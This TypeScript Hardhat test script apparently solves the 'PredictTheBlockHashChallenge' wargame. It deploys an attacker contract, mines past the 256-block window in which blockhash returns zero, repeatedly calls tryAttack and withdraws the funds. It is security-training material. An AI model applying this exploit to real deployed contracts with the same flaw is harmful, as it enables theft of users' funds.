import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let target: Contract;


  before(async () => {
    const targetFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge');
    target = targetFactory.attach(`0x880fD25e4a71bc3186A4629902cE7d54E595892E`);
    // target = await targetFactory.deploy({
    //   value: utils.parseEther('1'),
    // });
    // await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const attackerFactory = await ethers.getContractFactory('PredictTheBlockHashChallengeAttacker');
    const attacker: Contract = await attackerFactory.deploy(target.address, {
      value: utils.parseEther('1'),
      gasLimit: 1e6,  // adding gas limit to 
      gasPrice: 1000000000000,
    });
    const receipt = await attacker.deployed();

    console.log("receipt : " + receipt.address);

    const { blockNumber: lockBlockNumber } = await provider.getTransaction(
      receipt.deployTransaction.hash
    );

    const minBlockNumber = <number>lockBlockNumber + 256 + 1;

    console.log(lockBlockNumber, minBlockNumber);

    console.log('wait 256 blocks');
    // commented for testing
    // await new Promise((resolve) => setTimeout(resolve, 1000 * 13 * 256));

    let blockNumber = await provider.getBlockNumber();
    while (blockNumber < minBlockNumber) {
      console.log('waiting');

      // commented for testing
      // await new Promise((resolve) => setTimeout(resolve, 1000 * 13));
      await network.provider.send('evm_mine');

      blockNumber = await provider.getBlockNumber();
      console.log('blockNumber', blockNumber);
    }

    while (!(await target.isComplete())) {
      try {
        console.log('trying');
        const tx = await attacker.tryAttack();
        await tx.wait();
      } catch (error) {
        console.log(error);
        await new Promise((resolve) => setTimeout(resolve, 1000 * 13));
      }
    }

    console.log('withdrawing');
    const tx = await attacker.withdraw();
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
